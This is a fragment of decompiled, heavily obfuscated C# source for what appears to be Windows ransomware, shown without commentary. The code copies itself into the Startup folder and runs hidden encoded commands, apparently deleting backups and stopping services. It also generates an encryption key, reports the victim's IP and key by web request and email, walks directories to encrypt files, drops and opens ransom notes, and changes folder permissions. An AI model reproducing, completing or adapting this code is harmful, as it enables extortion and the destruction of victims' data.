				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(caeCAmsUBmyy))
					{
						File.Delete(caeCAmsUBmyy);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string fIQvUmxkAl;

	public static byte[] LPxApPwqniHY;

	public static string nMpuHIafUPAp;

	public static string YJkGJJBIRovOj;

	public static List<string> bVwnJgANJJX;

	public static List<string> iqrCuzvYkXjwtcm;

	public static string tcsQFxjWmOpsK;

	public static string pxxUCyFtCioCIq;

	public static string aBmGKQqQKOKXI;

	public static string ScUsvWmHCwCQV;

	public static int fAaPLvxVdIH;

	public static string MUSNUeGXusODlj;

	public static string hvAaCDJUKlNlyQ;

	public static string LqttSwDKeOfKVGL;

	public static string aTdamFrIht;

	public static string LSXFEDBHoFy;

	public static string QGhmFcSSOpd;

	public static string yLikURVvfMWn;

	public static string vtClXupzLIIa;

	public static List<string> VfMwKIJnDnq;

	public static List<string> UPKUrcjvrOIo;

	public static string pCDNamZZtcA;

	public static string hxlrzYNLXivY;

	public static string HEFxJIDyDOEQ;

	public static List<string> WEPWhUGwUtN;

	public static string eAVlYZIMgieUnrF;

	private static string gowQgPpclwyAR;

	public static string zZukKkiWQnr;

	public static string ADXABfgmLhC;

	public static List<string> ZRptOrpWitgI;

	public static List<string> qYFjYYmMGKdoc;

	public static List<string> KzxmThJmEyI;

	public static List<string> QHdIaewLqjzP;

	public static string DUhHuAgmahdlA;

	public static List<string> jiYEBLyFlYFm;

	public static List<string> xdxALrKJFXo;

	public static string mqtXpUEsyADCeMhK;

	public static string SAzKwwZvNpBJmh;

	internal static DateTime ouwEpEgHjWnKG;

	internal static DateTime BXjtjHbqwTr;

	public static string oFvDUXnLvZqk;

	public static string bHpZgRTqvrgm;

	public static string ipFNahvaPROEXk;

	public static string zrUyzrZPIDWlXhjp;

	public static string iejckOPbiTz;

	public static string RSSzlZRmoGgc;

	public static string KpTletVVYGesVgJ;

	public static string SBthqYiSUsxxBW;

	public static List<string> vjYtJFEhxfpDHt;

	public static string VPYFBwfqxXvG;

	public static string NwFhVUnpoETLiI;

	public static string YvEHTcUVlCTu;

	public static string PCEnMQPjGdmTjQm;

	public static string dzRbLIqsNjPuSMGD;

	public static string NNrmRojQtuYk;

	public static string iXfseuxLbWAXZhvhX;

	public static string UZkJWLUkRyDvTUrp;

	public static string MdHwutNkJil;

	public static string oDjaaHeTYdLRe;

	public static string feRJgYPEWeMNP;

	public static string EDESHBJwSxAb;

	public static string qmqZfdVPNDVrV;

	public static string hLzPqVUHNDBTRb;

	public static string BtqZqLQFBmO;

	public static string pRNPdGPeQpVEwPTl;

	public static string zgNfaeUpQdihuu;

	public static string rKaBoqYgSFA;

	public static string uSYjGfleGibTQ;

	public static string czzhrocutRhNfDX;

	public static string UVdZomBXmMpt;

	public static string pPdKhFVJmZO;

	public static string lfXqQowefBr;

	public static string RoAatMNYmLOJwniz;

	public static string TSgiQXLBAlXJz;

	public static string rpGuhsNBODlBd;

	public static string hZkeSSxAGfnv;

	public static string UCIuWzHoOKJbZ;

	public static string MORlMWTkXsY;

	public static string[] JYXUPHymAoH;

	public static string dnEIlaYQbZTn;

	public static bool cWvIRXFCjdwL;

	public static string SVTLWKUNoTrhH;

	public static bool sBOTyxVoVCQkJ;

	public static bool XQmtXTGsKrTbZRB;

	public static bool SFPFOxOCIcuTMi;

	public static bool DPQGlgLKUqFEQNGu;

	public static string jYzmyFxkGGuJi;

	public static bool ZdcvQmUKIcPe;

	public static bool kWtTToUhSWi;

	public static bool goSZClWrjs;

	public static bool PwyBWpPgqFzY;

	public static bool GIsCSxnycEXIm;

	public static string nQpitcjrIGsGL;

	public static bool zcCjHpzjUtXX;

	public static Stopwatch SKETPxbxKDPaU;

	public static int FawBoUOtRlQs;

	public static int osEpTgsdhQw;

	public static bool YIgbUMLXEZ;

	public static string HkuaAWARBzGl;

	public static string[] xcNorQckRgJ;

	public static List<string> jTmqLrXLyeK;

	public static int WearPPVsyOavvo;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			uvQwMOSVpyQBi CS_0024_003C_003E8__locals0 = new uvQwMOSVpyQBi();
			CS_0024_003C_003E8__locals0.MLLKjXmHrbJXE = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.MLLKjXmHrbJXE) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			znQmDPIuNDj.ufMHTstqgeqYn(gowQgPpclwyAR);
		}
		catch (Exception)
		{
		}
		try
		{
			if (rpGuhsNBODlBd == getString_0(107396887))
			{
				Thread thread = new Thread(AvzJnzhDtbGaEwo.YExTqSxoVsGUxX);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (LqttSwDKeOfKVGL == getString_0(107396887))
		{
			Thread.Sleep(int.Parse(aTdamFrIht));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && KpTletVVYGesVgJ == getString_0(107396887))
		{
			try
			{
				ZmlgiYsphqQjDXK(tzJESwPzibp(getString_0(107396882)));
			}
			catch
			{
			}
		}
		try
		{
			if (yLikURVvfMWn == getString_0(107396887) && WntNZtuAxQayz.UhCUfFPaSZ())
			{
				new FkTsTousMceh().KsVXTtOkLvRgeRE(bool_0: false);
				WntNZtuAxQayz.qYpuMuaqSxXqgEG();
			}
		}
		catch (Exception)
		{
		}
		if (hxlrzYNLXivY == getString_0(107396887) && WntNZtuAxQayz.UhCUfFPaSZ())
		{
			new FkTsTousMceh().KsVXTtOkLvRgeRE(bool_0: false);
			new FkTsTousMceh().xOEsXJRLbcApzr();
		}
		if (hvAaCDJUKlNlyQ == getString_0(107396887))
		{
			TkruuwDgNga.vdSRwfUkJFaxJPox();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396809);
			string text2 = text + Path.GetFileName(fileName);
			if (ScUsvWmHCwCQV == getString_0(107396887) && fileName != text2)
			{
				Thread thread2 = new Thread(jnMTNyJcvgRX);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (tcsQFxjWmOpsK == getString_0(107396887) && mainModule != null && fileName != text2)
			{
				try
				{
					fAaPLvxVdIH = kcroZYTBXiFR(0, VfMwKIJnDnq.Count);
					File.Copy(fileName, text + VfMwKIJnDnq[fAaPLvxVdIH], overwrite: true);
					Process.Start(text + VfMwKIJnDnq[fAaPLvxVdIH]);
					TgoHSjWJgMGOuilZ();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (mqtXpUEsyADCeMhK == getString_0(107396887) && DateTime.Now < ouwEpEgHjWnKG)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (SAzKwwZvNpBJmh == getString_0(107396887) && DateTime.Now > BXjtjHbqwTr)
			{
				TgoHSjWJgMGOuilZ();
			}
		}
		catch
		{
		}
		PDfRYXcapTpDuKuEw();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = qYFjYYmMGKdoc;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						VhRTDkROaDJx(tzJESwPzibp(getString_0(107391764)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> kzxmThJmEyI = KzxmThJmEyI;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						VhRTDkROaDJx(tzJESwPzibp(getString_0(107391783)), string_0);
					};
				}
				Parallel.ForEach(kzxmThJmEyI, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (MORlMWTkXsY == getString_0(107396887))
				{
					string[] jYXUPHymAoH = JYXUPHymAoH;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							VhRTDkROaDJx(tzJESwPzibp(getString_0(107391783)), getString_0(107391726) + string_0 + getString_0(107391749));
						};
					}
					Parallel.ForEach(jYXUPHymAoH, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!pecXPOiThg().Contains(getString_0(107392461)))
				{
					VmtCVaiDDCwJtQU(DUhHuAgmahdlA);
				}
				else
				{
					List<string> qHdIaewLqjzP = QHdIaewLqjzP;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							VhRTDkROaDJx(tzJESwPzibp(iEGJafDjDASROi(getString_0(107391744))), string_0);
						};
					}
					Parallel.ForEach(qHdIaewLqjzP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> source2 = jiYEBLyFlYFm;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						VhRTDkROaDJx(tzJESwPzibp(getString_0(107391719)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (qmqZfdVPNDVrV == getString_0(107396804))
		{
			EdvNrTKkIYMADxZ();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && SFPFOxOCIcuTMi)
			{
				try
				{
					Thread thread4 = new Thread(zoYFoDbQMGa.VJXBtoyqNwOjs);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			VhRTDkROaDJx(getString_0(107396799), tzJESwPzibp(getString_0(107396754)));
		}
		SecureString secureString = new SecureString();
		if (ipFNahvaPROEXk == getString_0(107396804))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			pxxUCyFtCioCIq = getString_0(107397225);
		}
		aBmGKQqQKOKXI = BbfzHGzwtqigo.eTbdqfTZKGyJb(uLFkMuqolClt(secureString));
		if (goSZClWrjs)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), nQpitcjrIGsGL)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), nQpitcjrIGsGL), string.Concat(tzJESwPzibp(getString_0(107397148)), new WebClient().DownloadString(tzJESwPzibp(getString_0(107397155))), getString_0(107397082), tzJESwPzibp(getString_0(107397077)), DateTime.Now, getString_0(107397082), tzJESwPzibp(getString_0(107397068)), aBmGKQqQKOKXI));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), nQpitcjrIGsGL), getString_0(107396979) + aBmGKQqQKOKXI);
				}
			}
			catch (Exception ex7)
			{
				if (ZdcvQmUKIcPe)
				{
					try
					{
						File.AppendAllText(jYzmyFxkGGuJi, getString_0(107396438) + ex7.Message + getString_0(107397082));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		MWNwGjElsjX.hhBQtqSCgPPkQmry(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), czzhrocutRhNfDX), eCDmuoblbcTiBt(aBmGKQqQKOKXI), null, null, getString_0(107396421), getString_0(107396372), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			oXiyePOoZlOdic();
		}
		try
		{
			try
			{
				if (zcCjHpzjUtXX)
				{
					Console.WriteLine(getString_0(107396387));
				}
			}
			catch
			{
			}
			PulKJQStYv(new string[1] { getString_0(107396306) }, new string[100]
			{
				getString_0(107396329),
				getString_0(107396324),
				getString_0(107396319),
				getString_0(107396278),
				getString_0(107396273),
				getString_0(107396300),
				getString_0(107396295),
				getString_0(107396290),
				getString_0(107396285),
				getString_0(107396248),
				getString_0(107396243),
				getString_0(107396238),
				getString_0(107396261),
				getString_0(107396256),
				getString_0(107396215),
				getString_0(107396210),
				getString_0(107396205),
				getString_0(107396232),
				getString_0(107396227),
				getString_0(107396222),
				getString_0(107396693),
				getString_0(107396688),
				getString_0(107396715),
				getString_0(107396710),
				getString_0(107396705),
				getString_0(107396668),
				getString_0(107396663),
				getString_0(107396658),
				getString_0(107396653),
				getString_0(107396680),
				getString_0(107396675),
				getString_0(107396670),
				getString_0(107396633),
				getString_0(107396628),
				getString_0(107396651),
				getString_0(107396646),
				getString_0(107396641),
				getString_0(107396604),
				getString_0(107396295),
				getString_0(107396599),
				getString_0(107396285),
				getString_0(107396590),
				getString_0(107396617),
				getString_0(107396612),
				getString_0(107396607),
				getString_0(107396570),
				getString_0(107396565),
				getString_0(107396560),
				getString_0(107396587),
				getString_0(107396582),
				getString_0(107396577),
				getString_0(107396540),
				getString_0(107396535),
				getString_0(107396530),
				getString_0(107396525),
				getString_0(107396552),
				getString_0(107396547),
				getString_0(107396542),
				getString_0(107396501),
				getString_0(107396496),
				getString_0(107396519),
				getString_0(107396474),
				getString_0(107396599),
				getString_0(107396461),
				getString_0(107396484),
				getString_0(107395931),
				getString_0(107395922),
				getString_0(107395945),
				getString_0(107395936),
				getString_0(107395899),
				getString_0(107395890),
				getString_0(107395913),
				getString_0(107395904),
				getString_0(107395867),
				getString_0(107395862),
				getString_0(107395857),
				getString_0(107395884),
				getString_0(107395879),
				getString_0(107395874),
				getString_0(107395833),
				getString_0(107395828),
				getString_0(107395823),
				getString_0(107395850),
				getString_0(107395845),
				getString_0(107395840),
				getString_0(107395799),
				getString_0(107395790),
				getString_0(107395817),
				getString_0(107396633),
				getString_0(107395812),
				getString_0(107395807),
				getString_0(107395770),
				getString_0(107395765),
				getString_0(107395760),
				getString_0(107395783),
				getString_0(107395778),
				getString_0(107395773),
				getString_0(107395732),
				getString_0(107395727),
				getString_0(107395754)
			}, new string[0], uLFkMuqolClt(secureString), getString_0(107395749));
		}
		catch (Exception ex9)
		{
			if (ZdcvQmUKIcPe)
			{
				try
				{
					File.AppendAllText(jYzmyFxkGGuJi, getString_0(107395708) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715));
				streamWriter.WriteLine(tzJESwPzibp(getString_0(107396174)));
				streamWriter.WriteLine(getString_0(107397082));
				streamWriter.WriteLine(tzJESwPzibp(getString_0(107394756)));
				streamWriter.WriteLine(aBmGKQqQKOKXI);
				if (zZukKkiWQnr == getString_0(107396804))
				{
					streamWriter.WriteLine(getString_0(107397082));
					streamWriter.WriteLine(tzJESwPzibp(getString_0(107394723)) + Convert.ToString(WEPWhUGwUtN.Count));
				}
				if (YIgbUMLXEZ)
				{
					streamWriter.WriteLine(getString_0(107397082));
					streamWriter.WriteLine(tzJESwPzibp(getString_0(107395126)));
					streamWriter.WriteLine(HSDASSgFriA.KzNxlIVvXTMnYo());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715));
				if (!text3.Contains(aBmGKQqQKOKXI) && !sBOTyxVoVCQkJ)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715), getString_0(107395093) + aBmGKQqQKOKXI);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in UPKUrcjvrOIo)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395715)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715), item + getString_0(107395715), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715));
					if (!text4.Contains(aBmGKQqQKOKXI) && !sBOTyxVoVCQkJ)
					{
						File.AppendAllText(item + getString_0(107395715), getString_0(107395093) + aBmGKQqQKOKXI);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!DPQGlgLKUqFEQNGu && num > 10)
			{
				break;
			}
		}
		if (lfXqQowefBr == getString_0(107396887))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395064)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395064));
					streamWriter2.WriteLine(tzJESwPzibp(getString_0(107395075)));
					streamWriter2.WriteLine(getString_0(107397082));
					streamWriter2.WriteLine(tzJESwPzibp(getString_0(107395026)));
					streamWriter2.WriteLine(aBmGKQqQKOKXI + tzJESwPzibp(getString_0(107394937)));
					if (zZukKkiWQnr == getString_0(107396804))
					{
						streamWriter2.WriteLine(getString_0(107397082));
						streamWriter2.WriteLine(tzJESwPzibp(getString_0(107394956)) + tzJESwPzibp(getString_0(107394723)) + Convert.ToString(WEPWhUGwUtN.Count) + tzJESwPzibp(getString_0(107394937)));
					}
					if (YIgbUMLXEZ)
					{
						streamWriter2.WriteLine(getString_0(107397082));
						streamWriter2.WriteLine(tzJESwPzibp(getString_0(107395126)));
						streamWriter2.WriteLine(HSDASSgFriA.KzNxlIVvXTMnYo());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715));
					if (!text5.Contains(aBmGKQqQKOKXI) && !sBOTyxVoVCQkJ)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395064), tzJESwPzibp(getString_0(107394956)) + getString_0(107395093) + aBmGKQqQKOKXI + tzJESwPzibp(getString_0(107394937)));
					}
				}
			}
			catch
			{
			}
		}
		if (eAVlYZIMgieUnrF == getString_0(107396887))
		{
			try
			{
				if (zZukKkiWQnr == getString_0(107396804))
				{
					HSDASSgFriA.VTFfNHKtSAEf(getString_0(107394351), getString_0(107394378), getString_0(107394365), string.Concat(tzJESwPzibp(getString_0(107397148)), new WebClient().DownloadString(tzJESwPzibp(getString_0(107397155))), getString_0(107394324), tzJESwPzibp(getString_0(107397077)), DateTime.Now, getString_0(107397082), tzJESwPzibp(getString_0(107394319)), Convert.ToString(WEPWhUGwUtN.Count), getString_0(107397082), tzJESwPzibp(getString_0(107397068)), aBmGKQqQKOKXI));
				}
				else
				{
					HSDASSgFriA.VTFfNHKtSAEf(getString_0(107394351), getString_0(107394378), getString_0(107394365), string.Concat(tzJESwPzibp(getString_0(107397148)), new WebClient().DownloadString(tzJESwPzibp(getString_0(107397155))), getString_0(107394324), tzJESwPzibp(getString_0(107397077)), DateTime.Now, getString_0(107397082), tzJESwPzibp(getString_0(107394319)), Convert.ToString(WEPWhUGwUtN.Count), getString_0(107397082), tzJESwPzibp(getString_0(107397068)), aBmGKQqQKOKXI));
				}
			}
			catch
			{
			}
		}
		if (vtClXupzLIIa == getString_0(107396887))
		{
			try
			{
				vTCpXMPbaY.EZcnCEHSFLgi(new Uri(getString_0(107394302)));
			}
			catch
			{
			}
		}
		if (lfXqQowefBr == getString_0(107396804))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715)))
				{
					Process.Start(tzJESwPzibp(getString_0(107394301)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395715));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395064)))
				{
					Process.Start(tzJESwPzibp(getString_0(107394276)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395064));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(NNrmRojQtuYk))
		{
			try
			{
				File.Delete(NNrmRojQtuYk);
			}
			catch
			{
			}
		}
		if (ZdcvQmUKIcPe)
		{
			try
			{
				File.AppendAllText(jYzmyFxkGGuJi, getString_0(107394227));
			}
			catch (Exception)
			{
			}
		}
		if (fIQvUmxkAl == getString_0(107394246))
		{
			TgoHSjWJgMGOuilZ();
		}
	}

	public static void jnMTNyJcvgRX()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(tzJESwPzibp(getString_0(107394237)), tzJESwPzibp(getString_0(107394595)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int kcroZYTBXiFR(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> YSYHoZSeHsnH(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107394566)) && !text.Contains(getString_0(107394509)) && !text.Contains(getString_0(107394508)) && !text.ToLower().Contains(getString_0(107394459)) && !text.ToLower().Contains(getString_0(107394446)) && !text.Contains(getString_0(107394421)) && !text.Contains(getString_0(107394432)) && !text.ToLower().Contains(getString_0(107393875)) && !text.ToLower().Contains(getString_0(107393894)) && !text.ToLower().Contains(getString_0(107393857)) && !text.ToLower().Contains(getString_0(107393816)) && !text.ToLower().Contains(getString_0(107393831)) && !text.ToLower().Contains(getString_0(107393786)) && !text.ToLower().Contains(getString_0(107393773)) && !text.ToLower().Contains(getString_0(107393752)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107393759)) && !fileInfo.FullName.Contains(getString_0(107393710)) && !fileInfo.FullName.Contains(getString_0(107393725)) && !fileInfo.FullName.Contains(getString_0(107393708)) && !fileInfo.FullName.Contains(getString_0(107393659)) && !fileInfo.FullName.Contains(getString_0(107393674)) && !fileInfo.FullName.Contains(getString_0(107394137)) && !fileInfo.FullName.Contains(getString_0(107394152)) && !fileInfo.FullName.Contains(getString_0(107394107)) && !fileInfo.FullName.Contains(getString_0(107394118)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394073)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394092)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394043)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394058)) && !fileInfo.FullName.Contains(tzJESwPzibp(getString_0(107394009))) && !fileInfo.FullName.Contains(getString_0(107394016)) && !fileInfo.FullName.Contains(getString_0(107393971)) && !fileInfo.FullName.Contains(getString_0(107393986)) && !fileInfo.FullName.EndsWith(getString_0(107395749)) && !fileInfo.FullName.EndsWith(getString_0(107393941)) && !fileInfo.FullName.EndsWith(getString_0(107393936)) && !fileInfo.FullName.EndsWith(getString_0(107393963)) && !fileInfo.FullName.EndsWith(getString_0(107393958)) && !fileInfo.FullName.Contains(getString_0(107393953)) && !fileInfo.FullName.Contains(czzhrocutRhNfDX) && !fileInfo.FullName.Contains(jYzmyFxkGGuJi) && !fileInfo.FullName.Contains(nQpitcjrIGsGL))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(YJkGJJBIRovOj) * 1024.0 * 1024.0 && nMpuHIafUPAp == getString_0(107396887))
						{
							list.Add(fileInfo.FullName);
							zLlwXrvebez(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && nMpuHIafUPAp == getString_0(107396804))
						{
							list.Add(fileInfo.FullName);
							zLlwXrvebez(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void EdvNrTKkIYMADxZ()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107393904));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!bVwnJgANJJX.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107393339), getString_0(107396809)).Replace(getString_0(107393334), getString_0(107393339))
					.Replace(getString_0(107393325), getString_0(107394302))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					bVwnJgANJJX.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107393339), getString_0(107396809)).Replace(getString_0(107393334), getString_0(107393339))
						.Replace(getString_0(107393325), getString_0(107394302))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107393352), getString_0(107394302)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string VhRTDkROaDJx(string ufGWRTkfnue = "", string rpihrzRrjYG = "")
	{
		string result = getString_0(107394302);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ufGWRTkfnue,
				Arguments = rpihrzRrjYG,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void ZmlgiYsphqQjDXK(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393343),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string iEGJafDjDASROi(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string tzJESwPzibp(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void VmtCVaiDDCwJtQU(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = tzJESwPzibp(getString_0(107393294));
		processStartInfo.Arguments = getString_0(107393265) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool ugkeHnHORzZvwy(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

